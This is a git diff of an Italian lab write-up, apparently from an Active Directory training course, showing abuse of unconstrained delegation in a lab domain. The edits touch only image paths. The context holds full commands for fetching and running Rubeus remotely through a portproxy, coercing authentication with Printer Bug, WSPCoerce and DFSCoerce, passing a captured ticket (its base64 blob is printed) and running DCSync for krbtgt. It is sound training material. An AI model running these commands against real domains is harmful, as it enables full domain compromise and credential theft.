@@ -1,6 +1,6 @@
 # LEARNING OBJECTIVE15
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 1. &#x20;Find a server in dcorp domain where Unconstrained Delegation is\
    enabled.
@@ -25,7 +25,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Abbiamo individuato <kbd>dcorp-appsrv</kbd> come host che permette Unconstrained Delegation
 
@@ -53,7 +53,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Abbiamo conferma dall'output che appadmin ha accesso admin remoto su dcorp-appsrv
 
@@ -67,7 +67,7 @@ Copiamo Loader su <kbd>dcorp-appsrv</kbd>
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Yd
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Accediamo dcorp-appsrv con winrs
 
@@ -75,7 +75,7 @@ Accediamo dcorp-appsrv con winrs
 winrs -r:dcorp-appsrv cmd
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Aggiungiamo l'interfaccia portproxy dal dcorp-appsrv alla studentVM per poter eseguire Rubeus tramite Loader, hostato via hfs sulla studentVM su 172.16.100.60:80
 
@@ -89,7 +89,7 @@ Eseguiamo Rubeus in modalita' Monitor
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utilizzare Printer Bug per la Coercion\
 Sulla VM dello studente, utilizzare MS-RPRN per forzare l'autenticazione da dcorp-dc$.
@@ -98,18 +98,18 @@ Sulla VM dello studente, utilizzare MS-RPRN per forzare l'autenticazione da dcor
 C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tornando nel prompt dove c'e' in esecuzione Rubeus in modalita' Monitor e' possibile recuperare il Ticket (TGT) triggerato tramite PrinterBug
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Con il ticket ottenuto possiamo fare DCSync dalla studentVM e recuperare le credenziali dell'account krbtgt
 
 <pre class="language-powershell"><code class="lang-powershell"><strong>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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
 </strong></code></pre>
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Dopo aver importato il TGT possiamo usare SafetyKatz ed recuperare le credenziali <kbd>krbtgt</kbd>
 
@@ -117,7 +117,7 @@ Dopo aver importato il TGT possiamo usare SafetyKatz ed recuperare le credenzial
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SVOLGIMENTO PUNTO 2
 
@@ -129,7 +129,7 @@ Configurare Rubeus in modalità monitor esattamente come abbiamo fatto per il bu
 C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
 ```
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Se il target ha il servizio DFS Namespaces in esecuzione, possiamo utilizzarlo anche per la coercizione (è necessario il traffico sulla porta TCP 445 dalla VM dello studente a dcorp-dc e da dcorp-dc a dcorp-appsrv).
 
@@ -137,7 +137,7 @@ Se il target ha il servizio DFS Namespaces in esecuzione, possiamo utilizzarlo a
 C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Per ottenere i privilegi di Enterprise Admin, è necessario forzare l'autenticazione da mcorp-dc. Eseguire il comando riportato di seguito per ascoltare i ticket mcorp-dc$ su dcorp-appsrv:
 
